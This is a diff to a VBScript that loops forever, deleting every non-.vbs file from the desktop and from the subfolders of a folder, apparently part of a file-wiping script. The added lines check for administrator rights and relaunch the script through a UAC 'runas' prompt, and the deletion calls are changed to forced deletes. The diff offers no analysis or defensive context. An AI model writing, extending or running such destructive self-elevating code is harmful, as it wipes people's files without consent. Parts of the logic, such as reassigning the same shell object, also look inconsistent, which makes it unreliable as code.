@@ -1,3 +1,12 @@
+Set objShell = CreateObject("WScript.Shell")
+
+' Check if the script is already running with administrator privileges
+If Not objShell.Run("cmd /k cd %windir% & whoami /groups | findstr /b /c:""Mandatory Label\High Mandatory Level""") = 0 Then
+    ' If not running with administrator privileges, prompt to run as administrator
+    objShell.Run "cmd /k cd %windir% & net session >nul 2>&1 || (echo Set UAC = CreateObject^(""Shell.Application""^) : UAC.ShellExecute ""wscript.exe"", """ & WScript.ScriptFullName & """, """", ""runas"", 1 : Set UAC = Nothing : exit"") & exit", 1, True
+    WScript.Quit
+End If
+
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 Set objShell = CreateObject("Shell.Application")
 strScriptPath = WScript.ScriptFullName
@@ -29,7 +38,7 @@ Do While True
     ' Loop through the desktop folder and delete non-vbs files
     For Each objFile In objFSO.GetFolder(strDesktopFolder).Files
         If objFSO.GetExtensionName(objFile.Name) <> "vbs" Then
-            objShell.ShellExecute "cmd.exe", "/c del """ & objFile.Path & """", "", "runas", 1
+            objFSO.DeleteFile objFile.Path, True
         End If
     Next
 
@@ -39,14 +48,7 @@ Do While True
     For Each objSubFolder In objExplorerFolder.SubFolders
         For Each objFile In objSubFolder.Files
             If objFSO.GetExtensionName(objFile.Name) <> "vbs" Then
-                ' Check if elevation is required
-                If Not objFSO.GetDrive(objFile.Path).IsReady Then
-                    ' Prompt for elevation
-                    objShell.ShellExecute "cmd.exe", "/c del """ & objFile.Path & """", "", "runas", 1
-                Else
-                    ' No elevation required, proceed with deletion
-                    objFSO.DeleteFile objFile.Path, True
-                End If
+                objFSO.DeleteFile objFile.Path, True
             End If
         Next
     Next
